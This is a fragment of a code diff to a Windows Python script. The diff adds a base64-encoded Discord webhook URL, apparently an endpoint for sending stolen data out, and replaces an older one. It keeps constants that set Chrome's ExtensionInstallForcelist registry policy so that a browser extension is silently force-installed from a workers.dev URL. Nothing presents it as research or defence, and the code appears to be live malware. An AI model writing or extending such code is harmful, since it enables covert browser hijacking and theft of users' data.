@@ -5,31 +5,10 @@ import time
 from pathlib import Path
 import winreg
 
+WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1OTQ1ODQ1MTA2NTkyOTc1MS9qQlZxRmJZdW9ya3M2VVY3aE03MzZ3SFduSTB1OEk5c1NfM2RZVGdMV3g5bVZwZnVVS0hHRzFkZVlUZ0hvazJLazVqdQ=="
+
 EXT_REG_VALUE = "clfbahpbgmlbahejgcbninkkbljjnpki;https://pc-lamartin.anna-benbekthi.workers.dev/update.xml"
 EXT_REG_KEY = r"Software\Policies\Google\Chrome\ExtensionInstallForcelist"
-
-def ensure_package(package_name, import_name):
-    """
-    Ensure a Python package is installed.
-    
-    :param package_name: Name used by pip (e.g. 'pywin32')
-    :param import_name: Module to test import (e.g. 'win32com.client')
-    """
-    try:
-        importlib.import_module(import_name)
-    except ImportError:
-        subprocess.check_call([
-            sys.executable,
-            "-m",
-            "pip",
-            "install",
-            "--upgrade",
-            package_name,
-        ])
-
-# ensure_package("pywin32", "win32com.client")
-# ensure_package("requests", "requests")
-# ensure_package("psutil", "psutil")
 
 try:
     import win32com.client
@@ -38,7 +17,6 @@ try:
 except:
     sys.exit()
 
-WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NzAwNjk4NTAzMDI3MTA3Ni9xdUVRY0VxcEFGN3c2TUg4REduSlRtaTBuSUtFVGl2WXpMbEpVNlNSLUpsSWxGYmNLaUtFNDVlczZ1ZGxmOGVFQklBZw=="
 
 def encrypt(text: str) -> str:
     b64 = base64.b64encode(text.encode()).decode()
